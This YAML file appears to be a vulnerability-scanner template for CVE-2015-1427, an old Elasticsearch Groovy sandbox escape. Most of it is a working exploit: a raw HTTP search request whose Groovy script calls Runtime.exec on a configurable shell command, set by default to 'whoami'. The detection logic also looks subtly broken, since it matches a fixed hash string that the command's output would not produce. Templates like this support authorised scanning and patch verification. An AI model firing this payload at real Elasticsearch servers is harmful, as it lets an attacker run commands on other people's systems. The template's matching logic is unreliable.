id: elasticsearch-rce-cve-2015-1427

info:
  name: Elasticsearch Remote Code Execution (CVE-2015-1427)
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The Groovy script engine before Elasticsearch 1.3.8 and the Groovy script engine in 1.4.x before 1.4.3 allow remote attackers to bypass the sandbox protection mechanism and execute arbitrary shell commands through elaborate scripts.
  tags: rce
  reference:
    - https://github.com/zhzyker

variables:
  cmd: "whoami"

flow: |
  http(1) && http(2)

http:
  - id: initial-setup
    raw:
      - |
        POST /website/blog/ HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Accept-Language: en
        Content-Type: application/x-www-form-urlencoded

        { "name": "cve-2015-1427" }
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201

  - id: execute-rce
    raw:
      - |
        POST /_search?pretty HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Accept-Language: en
        Content-Type: application/text

        {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"{{cmd}}\").getText()"}}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "460f7ccb583e25e09c0fe100a2c9e90d"
        part: body
